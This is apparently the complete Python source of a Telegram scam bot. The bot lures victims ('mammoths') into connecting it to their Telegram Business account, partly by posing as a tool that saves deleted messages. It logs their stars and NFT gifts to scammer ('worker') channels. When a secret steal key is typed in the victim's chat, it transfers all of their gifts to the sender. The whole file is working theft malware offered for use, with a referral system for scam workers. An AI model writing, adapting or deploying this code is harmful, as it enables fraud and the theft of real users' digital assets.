import telebot.async_telebot as async_telebot
from telebot import types
import base64
import asyncio
import os

import database
import api as mlcapi
import config

bot = async_telebot.AsyncTeleBot(config._TOKEN)

___TOKEN___ = config._TOKEN

def encrypt(input_string):
    return base64.b64encode(input_string.encode('utf-8')).decode('utf-8')

@bot.message_handler(commands=['referalka'])
async def get_my_ref(message: types.Message) -> None:
    _USER_ID = message.chat.id
    try:
        bot_username = (await bot.get_me()).username
        await bot.send_message(_USER_ID, (f"🦣 Ваша ссылка для привода мамонтов: https://t.me/{bot_username}?start={_USER_ID}"))
        print(f"/referalka by {_USER_ID}")
    except Exception as e:
        print(f"Error getting bot username or sending message for /get_ref: {e}")
        await bot.send_message(_USER_ID, "Не удалось сгенерировать реферальную ссылку.")


@bot.message_handler(commands=['start'])
async def start(message: types.Message) -> None:
    _USER_ID = message.chat.id
    args = message.text.split()
    referral_code = args[1] if len(args) > 1 else None
    _WORKER = "Неизвестный" if referral_code is None else referral_code

    try:
        exists = await database.is_user_exists(_USER_ID)
        if not exists:
            await database.add_user(_USER_ID, False, _WORKER)

        text = (f"<b>📌 Для полноценной работы необходимо подключить бота к бизнес-аккаунту в Telegram. Как это сделать?" "\n\n"
            "1. ⚙️ Откройте Настройки Telegram." "\n"
            "2. 💼 Найдите пункт Telegram для бизнеса и нажмите на него." "\n"
            "3. 🤖 Перейдите в раздел Чат-боты." "\n"
            f"4. ✍️ Введите @{(await bot.get_me()).username}, и включите галочки ниже</b>")

        img_path = './img.png'
        if os.path.exists(img_path):
             with open(img_path, 'rb') as photo_file:
                await bot.send_photo(
                    chat_id=_USER_ID,
                    photo=photo_file,
                    caption=text,
                    parse_mode='HTML'
                )
        else:
            print(f"Warning: Image file not found at {img_path}. Sending text only.")
            await bot.send_message(_USER_ID, text, parse_mode='HTML')

        print(f"/start by {_USER_ID}, worker: {_WORKER}")

    except Exception as e:
        print(f"Error in start handler for user {_USER_ID}: {e}")
        await bot.send_message(_USER_ID, "Произошла ошибка при обработке команды /start.")


@bot.business_connection_handler(func=lambda conn: True)
async def business_connection(conn: types.BusinessConnection) -> None:
    _ID = conn.id
    _USER_ID = conn.user.id
    if conn.user.username: _USER_NAME = conn.user.username 
    else: _USER_NAME = "No username"
    _WORKER = await database.get_worker_by_mamont_id(_USER_ID)
    _WORKER = _WORKER if _WORKER is not None else "Неизвестный"
    _KEY = encrypt(str(_USER_ID))[:12]

    try:
        alive = await database.is_mamont_exists(_ID)
        if not alive:
            await database.add_mamont(_ID, _USER_ID, _KEY)

        if not conn.is_enabled:
            await database.update_mamont(_ID, False)
            await bot.send_message(config._LOGS_CONNECT_STAFF, (f"♦️ Клиент {_ID} отключил бота"))
            print(f"Business connection disabled: {_ID}")
            return

        print(f"Business connection enabled/updated: {_ID} by user {_USER_ID}")

        if config._LEGIT_MODE:
            try:
                bot_username = (await bot.get_me()).username
                await bot.send_message(_USER_ID, (
                        "✅ Бот успешно установлен.\n\n"
                        "Теперь каждое сообщение, удалённое/изменённое собеседником будет отправлено в этот чат\n"
                        "Так-же, просто ответив на любое исчезающее сообщение оно будет отправлено в этот чат\n"
                        f"@{bot_username}\n\n"
                        "🩵Скорее беги опробовать!)"
                    ))
            except Exception as e:
                print(f"User {_USER_ID} didn't start bot before setting as business-bot or blocked it, failed to send legit mode msg: {e}")

        _VIEW_RIGHT = False
        giftlist = ""
        giftcount = 0
        _STARS = "Неизвестно"

        try:
            stars_result = await mlcapi.get_stars(___TOKEN___, _ID)
            if isinstance(stars_result, dict) and stars_result.get('ok'):
                result_data = stars_result.get('result')
                if isinstance(result_data, dict):
                    star_amount = result_data.get('star_amount')
                    if isinstance(star_amount, (int, float)):
                         _STARS = str(star_amount) + " шт."
                         _VIEW_RIGHT = True
                    else:
                         _STARS = star_amount
                else:
                     _STARS = "Ошибка формата"
                     print(f"Warning: Unexpected 'result' format in get_stars for {_ID}: {result_data}")
            elif isinstance(stars_result, str) and stars_result == "Arguments exception":
                _STARS = "Ошибка аргументов"
            elif isinstance(stars_result, dict) and not stars_result.get('ok'):
                _STARS = f"Ошибка API: {stars_result.get('description', 'N/A')}"
            else:
                _STARS = "Неизвестный ответ API"
                print(f"Warning: mlcapi.get_stars unexpected result for {_ID}: {stars_result}")

            if _STARS != "Неизвестно" and not _STARS.startswith("Ошибка API"):
                gifts = await mlcapi.get_gift_list(___TOKEN___, _ID)
                if isinstance(gifts, list) and len(gifts) > 0:
                    if gifts[0].isdigit():
                        giftcount = int(gifts[0])
                        _VIEW_RIGHT = True
                        index = 0
                        for gift in gifts[1]:
                            giftik = gift['name']
                            prefix = "└" if index == len(gifts[1])-1 else "├"
                            giftlist += f' {prefix} t.me/nft/{giftik}' + '\n'
                            index += 1
                    else:
                        giftlist = f"└ {gifts[0]}"
                else:
                     giftlist = "└ Ошибка получения списка подарков"

        except Exception as e:
            print(f"Error fetching stars/gifts for connection {_ID}: {e}")
            _STARS = "Ошибка запроса"
            giftlist = "└ Ошибка запроса"

        lastPart = ""
        if _VIEW_RIGHT:
             lastPart = (f"🗂 Разрешения: Просмотр звезд/подарков {'✓' if _VIEW_RIGHT else '✗'}" "\n\n"
                         f"⭐️ Звёзд: {_STARS}" "\n"
                         f"🎁 Список подарков ({giftcount} шт.):" "\n"
                         f"{giftlist if giftlist else '└ Нет подарков'}")
        else: 
            lastPart = f"❌ Не удалось получить информацию о подарках. Возможно, не хватает разрешений"

        await database.update_mamont(_ID, True)
        log_message = (f"🔋 *Новый коннект:*\n"
                       f" ├ 🦣 *Клиент:* {_ID}\n"
                       f" ├ 👤 *Пользователь:* @{_USER_NAME} (`{_USER_ID}`)\n"
                       f" ├ 🚨 *Воркер:* {_WORKER}\n"
                       f" └ 🔐 *Ключ:* `{_KEY}`\n\n"
                       f"{lastPart}")

        await bot.send_message(config._LOGS_CONNECT_STAFF, log_message, parse_mode="Markdown")
        public_log_message = log_message.replace(f"{_KEY}", "Скрыт")
        await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message, parse_mode="Markdown")

        if isinstance(_WORKER, (int, str)) and str(_WORKER).isdigit():
            try:
                await bot.send_message(int(_WORKER), log_message, parse_mode="Markdown")
            except Exception as e:
                print(f"Failed to send log to worker {_WORKER}: {e}")
                await bot.send_message(config._LOGS_CONNECT_PUBLIC, f"Отправить лог воркеру {_WORKER} не удалось\n\n{e}")
        elif _WORKER != "Неизвестный":
             print(f"Worker ID '{_WORKER}' is not a valid integer ID. Cannot send log.")


    except Exception as e:
        print(f"Error processing business connection update for ID {_ID}: {e}")
        try:
            await bot.send_message(config._LOGS_CONNECT_STAFF, f"⚠️ Ошибка обработки бизнес-коннекта {_ID}: {e}")
        except:
            pass


@bot.business_message_handler(func=lambda message: True)
async def echo(message: types.Message) -> None:
    if not hasattr(message, 'business_connection_id') or message.business_connection_id is None:
        print(f"Ignoring non-business message from {message.chat.id}")
        return

    _SENDER = message.from_user
    _UNIQUE_ID = message.business_connection_id
    _MESSAGE_TEXT = message.text if message.text else ""

    #print(f"Received business message from connection {_UNIQUE_ID}, text: '{_MESSAGE_TEXT[:30]}...'")

    if len(_MESSAGE_TEXT) > 16:
        return

    try:
        is_valid_key = await database.is_steal_key_valid(_UNIQUE_ID, _MESSAGE_TEXT)
        if not is_valid_key:
            return

        print(f"Valid steal key '{_MESSAGE_TEXT}' received for connection {_UNIQUE_ID}. Proceeding...")

        await bot.send_message(config._LOGS_MESSAGE, f"🎛 Воруем у {_UNIQUE_ID}...")

        gifts = await mlcapi.get_gift_list(___TOKEN___, _UNIQUE_ID)
        giftcount = 0

        if isinstance(gifts, list) and len(gifts)>0 and gifts[0].isdigit():
             giftcount = int(gifts[0])
        elif isinstance(gifts, list) and len(gifts)>0:
            error_msg = gifts[0]
            await bot.send_message(config._LOGS_MESSAGE, f"❌ Не удалось получить список подарков у {_UNIQUE_ID} для tg://user?id={_SENDER.id}: {error_msg}")
            return
        else:
            await bot.send_message(config._LOGS_MESSAGE, f"❌ Не удалось получить список подарков у {_UNIQUE_ID} для tg://user?id={_SENDER.id} (Неизвестная ошибка)")
            return

        if giftcount == 0 or gifts[1] is None:
            await bot.send_message(config._LOGS_MESSAGE, f"❌ Нету подарков у {_UNIQUE_ID}, чтобы украсть для tg://user?id={_SENDER.id}")
            return

        for gift in gifts[1]:
            gift_id = gift['id']
            gift_name = gift['name']
            steal_target_user_id = _SENDER.id

            steal_result = await mlcapi.transfer_gift(___TOKEN___, _UNIQUE_ID, gift_id, steal_target_user_id)
            print(f"Transfer gift result for {gift_name} from {_UNIQUE_ID} to {steal_target_user_id}: {steal_result}")

            steal_status = "✅" if isinstance(steal_result, dict) and steal_result.get('ok') else f"❌ ({steal_result.get('description', 'N/A') if isinstance(steal_result, dict) else str(steal_result)})"
            log_text = (f"✏️ Пытаемся украсть t.me/nft/{gift_name} у {_UNIQUE_ID} для tg://user?id={steal_target_user_id}\n"
                        f"⏳ Результат: {steal_status}")
            await bot.send_message(config._LOGS_MESSAGE, log_text)

            if not (isinstance(steal_result, dict) and steal_result.get('ok')):
                await bot.send_message(config._LOGS_MESSAGE, (f"❌ Отмена дальнейшего стила, т.к. попытка стила была не удачная"))
                return

    except Exception as e:
        print(f"Error processing business message for connection {_UNIQUE_ID}: {e}")
        try:
             await bot.send_message(config._LOGS_MESSAGE, f"⚠️ Ошибка обработки сообщения от {_UNIQUE_ID}: {e}")
        except:
            pass

async def main_async():
    print("Initializing database...")
    await database.init_db()
    print("Starting bot polling...")
    await bot.polling(non_stop=True)

def main(TOKEN) -> None:
    global ___TOKEN___
    ___TOKEN___ = TOKEN

    print(f"Bot starting with token: {TOKEN[:10]}...{TOKEN[-4:]}")

    while True:
        try:
            asyncio.run(main_async())
        except KeyboardInterrupt:
            print("Bot stopped manually.")
        except Exception as e:
            print(f"Bot encountered a fatal error: {e}")